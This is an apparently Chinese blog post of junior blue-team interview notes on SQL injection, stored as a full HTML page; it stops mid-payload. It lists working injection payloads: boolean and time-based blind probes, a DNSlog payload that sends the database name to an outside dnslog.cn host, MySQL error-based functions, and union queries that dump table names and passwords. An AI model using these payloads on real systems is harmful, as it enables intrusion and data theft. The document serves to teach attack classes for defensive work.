@@ -1,0 +1,512 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>分类: 技术 | 暮色随风</title><meta name="author" content="zha0fe1"><meta name="copyright" content="zha0fe1"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="蓝初 蓝队面试题整理面试题总结  SQL注入分类按照注入点分类数字型注入当我们访问页面时经常会出现http:xxx.com?id&#x3D;1这种形式的url，这个时候我们输入and 1&#x3D;1与and 1&#x3D;2,进行判定看是否会出现and 1&#x3D;1回显正常，and 1&#x3D;2回显不正常的情况。如果出现了我们一般就认为这里存在注入，并且是数字型注入。如果没有出现那么并不">
+<meta property="og:type" content="article">
+<meta property="og:title" content="蓝初面试">
+<meta property="og:url" content="https://musewithwind.gitee.io/2023/06/23/0110%20HW%E9%9D%A2%E8%AF%95/index.html">
+<meta property="og:site_name" content="暮色随风">
+<meta property="og:description" content="蓝初 蓝队面试题整理面试题总结  SQL注入分类按照注入点分类数字型注入当我们访问页面时经常会出现http:xxx.com?id&#x3D;1这种形式的url，这个时候我们输入and 1&#x3D;1与and 1&#x3D;2,进行判定看是否会出现and 1&#x3D;1回显正常，and 1&#x3D;2回显不正常的情况。如果出现了我们一般就认为这里存在注入，并且是数字型注入。如果没有出现那么并不">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://musewithwind-1313815601.cos.ap-chengdu.myqcloud.com/hacker.webp">
+<meta property="article:published_time" content="2023-06-23T01:55:00.000Z">
+<meta property="article:modified_time" content="2023-06-25T02:35:00.000Z">
+<meta property="article:author" content="zha0fe1">
+<meta property="article:tag" content="HW">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://musewithwind-1313815601.cos.ap-chengdu.myqcloud.com/hacker.webp"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://musewithwind.gitee.io/2023/06/23/0110%20HW%E9%9D%A2%E8%AF%95/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":200},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: true,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: {"limitCount":50,"languages":{"author":"作者: zha0fe1","link":"链接: ","source":"来源: 暮色随风","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '分类: 技术',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2023-06-25 10:35:00'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 5.4.2"></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><script>const preloader = {
+  endLoading: () => {
+    document.body.style.overflow = 'auto';
+    document.getElementById('loading-box').classList.add("loaded")
+  },
+  initLoading: () => {
+    document.body.style.overflow = '';
+    document.getElementById('loading-box').classList.remove("loaded")
+
+  }
+}
+window.addEventListener('load',()=> { preloader.endLoading() })
+
+if (true) {
+  document.addEventListener('pjax:send', () => { preloader.initLoading() })
+  document.addEventListener('pjax:complete', () => { preloader.endLoading() })
+}</script><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://musewithwind-1313815601.cos.ap-chengdu.myqcloud.com/touxiang.webp" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">21</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">20</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">2</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://musewithwind-1313815601.cos.ap-chengdu.myqcloud.com/hacker.webp')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">暮色随风</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">蓝初面试</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-06-23T01:55:00.000Z" title="发表于 2023-06-23 09:55:00">2023-06-23</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-06-25T02:35:00.000Z" title="更新于 2023-06-25 10:35:00">2023-06-25</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E6%8A%80%E6%9C%AF/">技术</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="蓝初面试"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="蓝初"><a href="#蓝初" class="headerlink" title="蓝初"></a>蓝初</h1><blockquote>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/dgs1mple/p/16000332.html#_302">蓝队面试题整理</a><br><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/5sx8vAzFivSZYo9E0rTKFQ">面试题总结</a></p>
+</blockquote>
+<h2 id="SQL注入分类"><a href="#SQL注入分类" class="headerlink" title="SQL注入分类"></a>SQL注入分类</h2><h3 id="按照注入点分类"><a href="#按照注入点分类" class="headerlink" title="按照注入点分类"></a>按照注入点分类</h3><h4 id="数字型注入"><a href="#数字型注入" class="headerlink" title="数字型注入"></a>数字型注入</h4><p>当我们访问页面时经常会出现http:xxx.com?id&#x3D;1这种形式的url，这个时候我们输入and 1&#x3D;1与and 1&#x3D;2,进行判定看是否会出现and 1&#x3D;1回显正常，and 1&#x3D;2回显不正常的情况。如果出现了我们一般就认为这里存在注入，并且是数字型注入。如果没有出现那么并不能排查这里没有注入，只是排除这里不存在数字型的注入。</p>
+<p>数字型注入还可以利用数字的增减操作进行布尔盲注，避免使用and，or 等敏感词</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">3</span><span class="number">-1</span></span><br><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="operator">%</span><span class="number">2</span>b1</span><br></pre></td></tr></table></figure>
+
+<h4 id="字符型"><a href="#字符型" class="headerlink" title="字符型"></a>字符型</h4><p>xxx.com?id&#x3D;1</p>
+<p>同样的url，我们输入 ‘ 看是否会出现报错的现象。如果存在我们可以进一步的闭合我们的语句。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">table</span> <span class="keyword">where</span> id<span class="operator">=</span><span class="string">&#x27;1&#x27;</span></span><br><span class="line">加入’ <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span> #</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">table</span> <span class="keyword">where</span> id<span class="operator">=</span><span class="string">&#x27;1&#x27;</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span> # <span class="string">&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="搜索型"><a href="#搜索型" class="headerlink" title="搜索型"></a>搜索型</h4><p>搜索框内会使用这样形式的sql语句进行查询</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span><span class="operator">*</span><span class="keyword">from</span> test <span class="keyword">where</span> names <span class="keyword">like</span> <span class="string">&#x27;%要查询的关键字%&#x27;</span></span><br><span class="line">我们写入类型这样的语句进行闭合 <span class="operator">%</span>’ <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span> #</span><br><span class="line"> <span class="keyword">SELECT</span><span class="operator">*</span><span class="keyword">from</span> test <span class="keyword">where</span> names <span class="keyword">like</span> <span class="string">&#x27;%要查询的关键字%&#x27;</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span> # <span class="operator">%</span> <span class="string">&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="按数据提交方式"><a href="#按数据提交方式" class="headerlink" title="按数据提交方式"></a>按数据提交方式</h3><h4 id="get注入"><a href="#get注入" class="headerlink" title="get注入"></a>get注入</h4><p>数据以get的方式进行提交。注入点一般在get提交的url后，可以通过bp抓包进行查找</p>
+<h4 id="post注入"><a href="#post注入" class="headerlink" title="post注入"></a>post注入</h4><p>数据以post的方式进行提交。注入点一般表单的填写处，如资料的填写等地方较为常见，可以通过bp抓包进行查找</p>
+<h4 id="http头部注入"><a href="#http头部注入" class="headerlink" title="http头部注入"></a>http头部注入</h4><ul>
+<li>user-agent:<ul>
+<li>判定用户使用的操作系统，以及使用的浏览器的版本</li>
+</ul>
+</li>
+<li>cookie:<ul>
+<li>判定用户的身份，进行session跟踪可以存储在用户本地终端上的数据，简单理解为用户的一张身份辨别卡</li>
+</ul>
+</li>
+<li>x-forwarded-for:<ul>
+<li>是用来识别通过HTTP代理或负载均衡方式连接到Web服务器的客户端最原始的IP地址的HTTP请求头字段</li>
+</ul>
+</li>
+<li>client-ip:<ul>
+<li>数据库保存客户端IP的参数</li>
+</ul>
+</li>
+<li>rerferer:<ul>
+<li>浏览器向web端表明自己从哪个连接而来</li>
+</ul>
+</li>
+<li>host:<ul>
+<li>客户端指定自己想访问的WEB服务器的域名&#x2F;IP 地址和端口号</li>
+</ul>
+</li>
+</ul>
+<h3 id="按照执行效果"><a href="#按照执行效果" class="headerlink" title="按照执行效果"></a>按照执行效果</h3><h4 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h4><blockquote>
+<p>特点：盲注在于无法构造出回显位时使用<br>优点：优点是适配绝大部分注入点<br>缺点：注入繁琐，费时费力，高频率对服务器发起访问也容易被ban。<br>分类：布尔盲注，时间盲注，dnslog盲注</p>
+</blockquote>
+<h4 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h4><p>特点:以页面回显的内容的不同作为判定依据。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span></span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span></span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="keyword">user</span>()<span class="operator">=</span>‘root<span class="variable">@localhost</span>’</span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> substr((<span class="keyword">select</span> <span class="keyword">user</span>()),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span> ‘r’</span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> <span class="keyword">user</span>()),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">=</span> <span class="number">114</span></span><br></pre></td></tr></table></figure>
+
+
+<h4 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h4><p>时间盲注，以回显的时间长短作为判断依据</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> sleep(<span class="number">2</span>)</span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> if((substr((<span class="keyword">select</span> <span class="keyword">user</span>()),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;r&#x27;</span>),sleep(<span class="number">2</span>),<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
+
+<h4 id="dnslog盲注"><a href="#dnslog盲注" class="headerlink" title="dnslog盲注"></a>dnslog盲注</h4><blockquote>
+<p>特点:<br>必须windows系统，必须root权限，必须secure_file_priv为空</p>
+</blockquote>
+<p>&#96;id&#x3D;2 and 1&#x3D;(selectload_file(concat(‘\\‘,hex(database()),’.pk4qft.dnslog.cn\test’)))&#96;&#96;</p>
+<h4 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h4><blockquote>
+<p>特点：<br>经过精心构造的函数，让函数处理user()等不合规定的数据，引发mysql报错。最常用的是updatexml()<br>优点：<br>报错注入优点是注入位置广泛，几乎任何和数据库有关的操作经过sql拼接都可以产生报错注入，有回显位，获取数据方便。<br>缺点：<br>必须开启错误提示，mysqli_error()</p>
+</blockquote>
+<p>关键函数：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>floor</span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> </span><br><span class="line">(<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>),concat(<span class="keyword">user</span>(),<span class="built_in">floor</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>))x <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span></span><br><span class="line"><span class="keyword">by</span> x)a);</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span>extractvalue()</span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span></span><br><span class="line">(extractvalue(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> <span class="keyword">user</span>()),<span class="number">0x7e</span>)));</span><br><span class="line"></span><br><span class="line"><span class="number">3.</span>updatexml()</span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> (updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span></span><br><span class="line"><span class="keyword">user</span>()),<span class="number">0x7e</span>),<span class="number">1</span>));</span><br><span class="line"></span><br><span class="line"><span class="number">4.</span>geometrycollection()</span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> geometrycollection((<span class="keyword">select</span> <span class="operator">*</span></span><br><span class="line"><span class="keyword">from</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b));</span><br><span class="line"></span><br><span class="line"><span class="number">5.</span>multipoint()</span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> multipoint((<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span></span><br><span class="line"><span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b));</span><br><span class="line"></span><br><span class="line"><span class="number">6.</span>polygon()</span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> polygon((<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="operator">*</span></span><br><span class="line"><span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b));</span><br><span class="line"></span><br><span class="line"><span class="number">7.</span>multipolygon()</span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> multipolygon((<span class="keyword">select</span> <span class="operator">*</span></span><br><span class="line"><span class="keyword">from</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b));</span><br><span class="line"></span><br><span class="line"><span class="number">8.</span>linestring()</span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> linestring((<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span></span><br><span class="line"><span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b));</span><br><span class="line"></span><br><span class="line"><span class="number">9.</span>multilinestring()</span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> multilinestring((<span class="keyword">select</span> <span class="operator">*</span></span><br><span class="line"><span class="keyword">from</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b));</span><br><span class="line"></span><br><span class="line"><span class="number">10.</span><span class="built_in">exp</span>()</span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="built_in">exp</span>(<span class="operator">~</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span></span><br><span class="line"><span class="keyword">user</span>())a));</span><br></pre></td></tr></table></figure>
+
+
+<h4 id="联合查询"><a href="#联合查询" class="headerlink" title="联合查询"></a>联合查询</h4><blockquote>
+<p>特点：<br>联合注入使用了union select联合查询，常用来拼接在where后面，并且通过报错的方式显示显位<br>优势：<br>联合注入通过显位的方式可以快速的爆出数据<br>缺点：<br>缺点是只能用在select最后处，后面如果还有sql语句就必须注释掉。并且必须用到union和select两个关键字，并且这两个关键字也很容易被拦截</p>
+</blockquote>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--关键函数：union select、group_concat</span></span><br><span class="line"></span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="operator">/</span>news.php?id<span class="operator">=</span><span class="number">1</span></span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="operator">/</span>news.php?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">4</span></span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="operator">/</span>news.php?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span></span><br><span class="line"><span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span></span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="operator">/</span>news.php?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">user</span>(),<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span></span><br><span class="line"></span><br><span class="line"><span class="comment">--sql语句为</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> news <span class="keyword">where</span> id <span class="operator">=</span> $id;</span><br><span class="line"></span><br><span class="line"><span class="comment">--确定列数</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> news <span class="keyword">where</span> id <span class="operator">=</span> <span class="number">1</span> <span class="keyword">order</span> <span class="keyword">by</span></span><br><span class="line"></span><br><span class="line"><span class="comment">--显示回显位</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> news <span class="keyword">where</span> id <span class="operator">=</span> <span class="number">-1</span> <span class="keyword">union</span></span><br><span class="line"><span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span></span><br><span class="line"></span><br><span class="line"><span class="comment">--通过回显位爆出内容</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> news <span class="keyword">where</span> id <span class="operator">=</span> <span class="number">-1</span> <span class="keyword">union</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">user</span>(),<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">--进而爆库，表，列，值。</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> news <span class="keyword">where</span> id <span class="operator">=</span> <span class="number">-1</span> <span class="keyword">union</span></span><br><span class="line"><span class="keyword">select</span> database(),<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> news <span class="keyword">where</span> id <span class="operator">=</span></span><br><span class="line"><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> group_concat(schema_name),<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>  <span class="keyword">from</span> information_schema.schemata</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> news <span class="keyword">where</span> id <span class="operator">=</span></span><br><span class="line"><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> group_concat(table_name),<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span> <span class="keyword">from</span> information_schema.tables</span><br><span class="line"><span class="keyword">where</span> table_schema<span class="operator">=</span>database()</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> news <span class="keyword">where</span> id <span class="operator">=</span></span><br><span class="line"><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> group_concat(table_name),<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span> <span class="keyword">from</span> information_schema.tables</span><br><span class="line"><span class="keyword">where</span> table_schema<span class="operator">=</span>database()</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> news <span class="keyword">where</span> id <span class="operator">=</span></span><br><span class="line"><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> group_concat(column_name),<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span> <span class="keyword">from</span> information_schema.columns</span><br><span class="line"><span class="keyword">where</span> table_name<span class="operator">=</span> <span class="string">&#x27;user&#x27;</span> <span class="keyword">and</span> table_schema<span class="operator">=</span>database()</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> news <span class="keyword">where</span> id <span class="operator">=</span> <span class="number">-1</span> <span class="keyword">union</span></span><br><span class="line"><span class="keyword">select</span> group_concat(password),<span class="number">2</span>,<span 